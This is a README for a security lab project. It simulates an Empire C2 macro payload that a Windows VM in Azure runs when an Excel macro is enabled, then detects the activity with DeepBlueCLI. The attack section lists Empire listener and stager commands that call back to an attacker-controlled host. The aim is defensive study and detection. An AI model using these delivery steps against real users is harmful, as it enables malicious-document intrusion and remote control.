# ⚔️ Empire Macro Payload Detection using DeepBlueCLI – Azure Edition

## 🎯 Project Goal
This project simulates the execution of a macro-generated PowerShell payload from Empire on a Windows VM hosted in Microsoft Azure. The objective is to capture and analyze the suspicious PowerShell activity in the Windows Event Log using [DeepBlueCLI](https://github.com/sans-blue-team/DeepBlueCLI), an open-source threat hunting and log analysis tool.

## ☁️ Environment Overview
| Component            | Details                                  |
|---------------------|------------------------------------------|
| Attacker Machine     | Kali Linux 2024.2 Gen2 (Azure VM)        |
| Victim Machine       | Windows 10/11 (Azure VM with Office)     |
| C2 Framework         | Empire by BC-Security                    |
| Payload Type         | PowerShell macro payload (`macro.py`)    |
| Detection Tool       | DeepBlueCLI                              |

## 🧪 Steps Performed

### 1. Setup in Azure
- Deployed Kali Linux 2024.2 (Empire installed)
- Deployed Windows 10/11 VM with Microsoft Excel and logging enabled
- Ensured both VMs are on the same virtual network with allowed port access (default: 1337)

### 2. Start Empire Listener on Kali
```bash
cd /opt/Empire
sudo ./empire
```

Inside Empire:
```bash
uselistener http
set Host http://<KALI-IP>:1337
execute
```

### 3. Generate PowerShell Macro Payload
```bash
usestager macro
set Listener http
generate
```

Output: Obfuscated PowerShell command using base64 encoding

Copy the payload into an Excel macro:

Open Excel → Press Alt + F11 → Paste into ThisWorkbook > Workbook_Open()

### 4. Execute Payload on Windows VM
Open the .xlsm file on the Windows VM

Enable Macros when prompted

Empire receives a connection (callback)

PowerShell payload executes silently

### 5. Analyze Windows Event Logs with DeepBlueCLI
Install and Run DeepBlueCLI
```powershell
git clone https://github.com/sans-blue-team/DeepBlueCLI.git
cd DeepBlueCLI
.\DeepBlue.ps1 -Log C:\Windows\System32\winevt\Logs\Security.evtx
```

Example Detection Output
```
[!] Suspicious PowerShell command detected:
Event ID 4104 - Encoded command string used
Parent Process: EXCEL.EXE
Command Line: powershell.exe -enc JAB...
```

## 🧠 Key Detection Artifacts
| Event ID | Description |
|----------|-------------|
| **4104** | PowerShell ScriptBlock Logging (obfuscated base64) |
| **4688** | New process created – Excel spawning PowerShell |
| **EventLog** | Analyzed by DeepBlueCLI for attacker techniques |

## 🔐 Defender Takeaways
- Obfuscated PowerShell commands can still be logged and detected with proper configuration.
- Even fileless payloads (like this macro) leave forensic footprints.
- DeepBlueCLI helps defenders quickly identify red flags inside `Security.evtx`.

## 📸 Screenshots
Add your screenshots to the `/screenshots` folder:
- `macro_code.png`: VBA macro in Excel
- `empire_listener.png`: Empire receiving the callback
- `event_log_4104.png`: Event Viewer showing suspicious PowerShell
- `deepbluecli_output.png`: Output from DeepBlueCLI

## Final Notes
This lab uses **no actual exploitation** or privilege escalation. It focuses purely on:
- Payload delivery simulation
- Logging
- Detection and analysis

## 📅 Presentation Date
May 31, 2025 @ BSidesRGV
